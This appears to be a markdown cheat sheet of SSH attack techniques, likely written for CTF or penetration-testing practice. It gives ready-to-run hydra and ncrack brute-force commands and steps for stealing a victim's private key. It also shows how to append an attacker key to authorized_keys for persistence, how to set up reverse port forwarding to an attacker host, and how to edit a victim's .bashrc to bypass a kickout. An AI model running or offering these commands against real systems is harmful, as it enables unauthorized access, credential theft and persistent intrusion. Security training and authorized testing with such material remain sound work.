
## Bruteforcing
+ hydra (hail hydra)    
`hydra <-L users.txt|-l <user>> <-P passwords.txt|-p <password>> -t 5 -v -V -e n -e s -o results.txt <ip> ssh`

+ ncrack
`ncrack -U username -P /usr/share/wordlists/rockyou.txt -p ssh <ip>`

##Impersonating

If a user has a private key, copy id_rsa key to your machine and try to ssh as the user    
`ssh "<user>"@<ip> -p <port> -i <path to id_rsa>`

Otherwise you can create your own key (`ssh-keygen` generates file `/home/<user>/.ssh/id_rsa.pub`) and copy it to the victim's file `/home/<user/.ssh/authorized_keys>` like this:
```
cat id_rsa.pub > .ssh/authorized_keys
```
or like this:
```
echo "ssh-rsa AAAA[...snip...]MQGB root@kali" >> .ssh/authorized_keys
```

##Port forwarding
###Reverse
On the victim machine connect to attacker machine and forward a port `<victim>:<port>` -> `<attacker>:<port>`    
`ssh <user>@<attacker ip> -R 2222:127.0.1.1:2222`

###Local
+ On the attacker machine connect to the victim machine and forward a port `<victim>:<port>` -> `<attacker>:<port>`    
`ssh -L <attacker port>:127.0.0.1:<victim port> <user>@<victim ip>`

##Overcoming instant kickout
###Method 1
Check `.bashrc` file    
`ssh <user>@<ip> -p <port> "cat /home/<user>/.bashrc"`    
If it has `exit` at the end remove it    
`ssh <user>@<ip> -p <port> "sed -i '/exit/s/^/#/' /home/<user>/.bashrc"`

###Method 2
Execute another instance of the shell    
`ssh <user>@<ip> -p <port> "/bin/bash"`

##Interesting files

ssh daemon configuration file    
`/etc/ssh/sshd_config`
